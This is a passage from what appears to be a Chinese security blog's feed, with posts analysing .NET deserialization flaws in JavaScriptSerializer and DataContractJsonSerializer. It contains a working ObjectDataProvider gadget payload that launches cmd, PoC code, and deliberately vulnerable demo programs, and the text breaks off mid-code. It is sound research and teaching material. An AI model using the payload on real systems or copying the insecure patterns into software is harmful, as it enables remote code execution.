    <link href="https://ke1nys.github.io/posts/cae71be0.html"/>
    <id>https://ke1nys.github.io/posts/cae71be0.html</id>
    <published>2024-03-13T08:26:46.000Z</published>
    <updated>2024-04-18T12:57:04.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JavaScriptSerializer"><a href="#JavaScriptSerializer" class="headerlink" title="JavaScriptSerializer"></a>JavaScriptSerializer</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">JavaScriptDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// no SimpleTypeResolver</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person() &#123; Name = <span class="string">&quot;jack&quot;</span> &#125;;</span><br><span class="line">            JavaScriptSerializer serializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            <span class="built_in">string</span> v = serializer.Serialize(person);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Person p = serializer.Deserialize&lt;Person&gt;(v);</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// SimpleTypeResolver</span></span><br><span class="line">            JavaScriptSerializer serializerWithType = <span class="keyword">new</span> JavaScriptSerializer(<span class="keyword">new</span> SimpleTypeResolver());</span><br><span class="line">            <span class="built_in">string</span> v1 = serializerWithType.Serialize(person);</span><br><span class="line">            Console.WriteLine(v1);</span><br><span class="line">            Person p1 = serializerWithType.Deserialize&lt;Person&gt;(v1);</span><br><span class="line">            Console.WriteLine(p1.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Name&quot;:&quot;jack&quot;&#125;</span><br><span class="line">jack</span><br><span class="line">&#123;&quot;__type&quot;:&quot;JavaScriptDeserialize.Person, ConsoleApplication2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot;,&quot;Name&quot;:&quot;jack&quot;&#125;</span><br><span class="line">jack</span><br></pre></td></tr></table></figure><p>这个类和DataContractJsonSerializer类有点类似  传需要的参数进去序列化内容才会有<code>__type</code>值</p><p>产生漏洞的原因是在构造函数有两个参数的重载：<code>public JavaScriptSerializer(JavaScriptTypeResolver resolver)</code>，其中JavaScriptTypeResolver参数是一个类型解析器，可在序列化字符串中自定义类型的元数据程序集限定名称。</p><p><img src="../images/image-20240313163841170.png" alt="image-20240313163841170"></p><p><strong>当构造函数使用SimpleTypeResolver参数时，序列化的json中会带有type信息，反序列化时就有漏洞隐患。反序列化方法有三个：</strong></p><h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><p>使用ObjectDataProvider攻击链，通过ObjectDataProvider来创建Process实例。payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;__type&#x27;:&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;,</span><br><span class="line">    &#x27;MethodName&#x27;:&#x27;Start&#x27;,</span><br><span class="line">    &#x27;ObjectInstance&#x27;:&#123;</span><br><span class="line">        &#x27;__type&#x27;:&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;,</span><br><span class="line">        &#x27;StartInfo&#x27;: &#123;</span><br><span class="line">            &#x27;__type&#x27;:&#x27;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;,</span><br><span class="line">            &#x27;FileName&#x27;:&#x27;cmd&#x27;, &#x27;Arguments&#x27;:&#x27;/c calc&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">JavaScriptDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SimpleTypeResolver</span></span><br><span class="line">            JavaScriptSerializer serializerWithType = <span class="keyword">new</span> JavaScriptSerializer(<span class="keyword">new</span> SimpleTypeResolver());</span><br><span class="line">            serializerWithType.Deserialize&lt;Object&gt;(File.ReadAllText(<span class="string">&quot;1.json&quot;</span>));</span><br><span class="line">            <span class="comment">// Console.ReadKey();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313170356169.png" alt="image-20240313170356169"></p><p>JavaScriptSerializer的Deserialize函数中</p><p><img src="../images/image-20240313170432985.png" alt="image-20240313170432985"></p><p>在此进入到deserialized函数中</p><p><img src="../images/image-20240313170509348.png" alt="image-20240313170509348"></p><p>然后接着进入到BasicDeserialize函数中</p><p><img src="../images/image-20240313170539219.png" alt="image-20240313170539219"></p><p>发现其调用的我们payload中的<code>__type</code>参数   然后进入到ConvertObjectToType这个函数中 </p><p><img src="../images/image-20240313170627526.png" alt="image-20240313170627526"></p><p>然后在ConvertDictionaryToObject函数中一步一步的将我们传入的<code>__type</code>参数里的值转化为对象</p><p><img src="../images/image-20240313172256774.png" alt="image-20240313172256774"></p><p>然后最后在进入到Process的Start函数中就结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JavaScriptSerializer&quot;&gt;&lt;a href=&quot;#JavaScriptSerializer&quot; class=&quot;headerlink&quot; title=&quot;JavaScriptSerializer&quot;&gt;&lt;/a&gt;JavaScriptSerializer&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-09</title>
    <link href="https://ke1nys.github.io/posts/aa209205.html"/>
    <id>https://ke1nys.github.io/posts/aa209205.html</id>
    <published>2024-03-12T09:02:15.000Z</published>
    <updated>2024-03-13T03:30:46.583Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md</a></p><h2 id="DataContractJsonSerializer"><a href="#DataContractJsonSerializer" class="headerlink" title="DataContractJsonSerializer"></a>DataContractJsonSerializer</h2><p>在dotnet中对于对象转json的处理有几大库，DataContractJsonSerializer、Json.net、JavaScriptSerializer。其中DataContractJsonSerializer、JavaScriptSerializer是dotnet自带的标准库，本文讲解DataContractJsonSerializer的使用。</p><p>这个类和xmlSerializer、DataContractSerializer一样  都是需要控制Type值 </p><p>Demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.name = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">            p.age = <span class="number">42</span>;</span><br><span class="line">            <span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            ser.WriteObject(memoryStream, p);</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> sr = <span class="keyword">new</span> StreamReader(memoryStream);</span><br><span class="line">            Console.WriteLine(sr.ReadToEnd());</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            Person p1 = (Person)ser.ReadObject(memoryStream);</span><br><span class="line">            Console.WriteLine(p1.name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person需要标记DataContract特性，序列化成员需要标记DataMember特性。通过WriteObject和ReadObject进行序列化和反序列化，demo和DataContractSerializer大致相同。注意构造函数传入了Person的type类型。如果实际环境type参数可控，那么可以造成RCE。</p><h2 id="WindowsPrincipal攻击链"><a href="#WindowsPrincipal攻击链" class="headerlink" title="WindowsPrincipal攻击链"></a>WindowsPrincipal攻击链</h2><p><img src="../images/image-20240313102416114.png" alt="image-20240313102416114"></p><p>yso生成的payload  关键点在于这个<code>__type</code>   __type字段可以通过DataContractJsonSerializerSettings传入DataContractJsonSerializer的构造方法</p><p><img src="../images/image-20240313102552811.png" alt="image-20240313102552811"></p><p>写个demo来测试一下</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), settings);</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                Person person = <span class="keyword">new</span> Person();</span><br><span class="line">                person.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">                person.age = <span class="number">19</span>;</span><br><span class="line">                ser.WriteObject(file, person);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入settings时    json中会包含<code>__type</code></p><p><img src="../images/image-20240313102711243.png" alt="image-20240313102711243"></p><p>当不传入settings时  json中不包含了<code>__type</code></p><p><img src="../images/image-20240313102832179.png" alt="image-20240313102832179"></p><p>当setting的EmitTypeInformation设置为EmitTypeInformation.Always时json会包含type信息。即上文yso生成的__type字段。</p><h3 id="Type可控"><a href="#Type可控" class="headerlink" title="Type可控"></a>Type可控</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(Type.GetType(<span class="string">&quot;System.Security.Principal.WindowsPrincipal&quot;</span>), settings);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们的type可控的时候   我们使用yso生成的payload是可以直接打的</p><p><img src="../images/image-20240313103446937.png" alt="image-20240313103446937"></p><p>在我们使用yso生成的json传入进去后  这个setting可有可无的  实战中只需要控制这个type值就行了</p><h3 id="KnownType特性"><a href="#KnownType特性" class="headerlink" title="KnownType特性"></a>KnownType特性</h3><p>这个东西  Y4er师傅说了难利用  看代码也能看出来  他是直接在代码中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[KnownType(typeof(WindowsPrincipal))]</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    [<span class="meta">KnownType(typeof(WindowsPrincipal))</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数中传入KnownType"><a href="#构造函数中传入KnownType" class="headerlink" title="构造函数中传入KnownType"></a>构造函数中传入KnownType</h3><p>这个相比于第二种的话  是更好利用的 因为这个是可以通过构造函数来进行利用的</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> List&lt;Type&gt; &#123; <span class="keyword">typeof</span>(WindowsPrincipal) &#125;);</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313104043879.png" alt="image-20240313104043879"></p><p><img src="../images/image-20240313104032117.png" alt="image-20240313104032117"></p><p>控制这个KnownType的话  就是Type可以是任意类了   必须是标记<code>[DataContract]</code>特性的类</p><p>以上的三种方法在用yso生成的payload的时候都能利用</p><p>除了上文三种方法外，再引入一个新的东西IDataContractSurrogate 接口</p><h2 id="IDataContractSurrogate"><a href="#IDataContractSurrogate" class="headerlink" title="IDataContractSurrogate"></a>IDataContractSurrogate</h2><p><img src="../images/image-20240313105413243.png" alt="image-20240313105413243"></p><p>参数解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// 摘要:</span><br><span class="line">//     初始化 System.Runtime.Serialization.Json.DataContractJsonSerializer 类的新实例，以便序列化或反序列化指定类型的对象。</span><br><span class="line">//     此方法还指定了可在对象图中呈现的已知类型的列表、要序列化或反序列化的最大图项数、是忽略意外数据还是发出类型信息以及自定义序列化的代理项。</span><br><span class="line">//</span><br><span class="line">// 参数:</span><br><span class="line">//   type:</span><br><span class="line">//     序列化或反序列化的实例的类型。</span><br><span class="line">//</span><br><span class="line">//   knownTypes:</span><br><span class="line">//     一个包含内容的根元素名称的 System.Xml.XmlDictionaryString。</span><br><span class="line">//</span><br><span class="line">//   maxItemsInObjectGraph:</span><br><span class="line">//     System.Collections.Generic.IEnumerable`1 的一个 System.Type，其中包含可在对象图中呈现的类型。</span><br><span class="line">//</span><br><span class="line">//   ignoreExtensionDataObject:</span><br><span class="line">//     若要在序列化时忽略 true 接口并在反序列化时忽略意外数据，则为 System.Runtime.Serialization.IExtensibleDataObject；否则为</span><br><span class="line">//     false。 默认值为 false。</span><br><span class="line">//</span><br><span class="line">//   dataContractSurrogate:</span><br><span class="line">//     一个用于自定义序列化过程的 System.Runtime.Serialization.IDataContractSurrogate 实现。</span><br><span class="line">//</span><br><span class="line">//   alwaysEmitTypeInformation:</span><br><span class="line">//     若要发出类型信息，则为 true；否则为 false。 默认值为 false。</span><br><span class="line">public DataContractJsonSerializer(Type type, IEnumerable&lt;Type&gt; knownTypes, int maxItemsInObjectGraph, bool ignoreExtensionDataObject, IDataContractSurrogate dataContractSurrogate, bool alwaysEmitTypeInformation);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中提到了dataContractSurrogate参数，用于自定义序列化过程的 System.Runtime.Serialization.IDataContractSurrogate 实现。</p><p><strong>因为DataContractJsonSerializer只有已知类型knownTypes的对象才能被序列化，而在实体类中不可避免的需要接入其他没有被标记DataContract特性的类，而没标记DataContract特性，就不在konwnTypes中，就不能被序列化。所以引入IDataContractSurrogate接口，作用是控制实体类引入了不在knownTypes中的类型实例应该如何被序列化存储。</strong></p><p>这里就和上文的那个WindowsPrincipal类的KnownType对应了</p><p>所以要是就是Type值设置为需要反序列化的类  要么就是KnowType设置  这两个其中一个设置就行</p><p><strong>(如果两者都不设置的话  就选下面的这个IDataContractSurrogate接口)</strong></p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 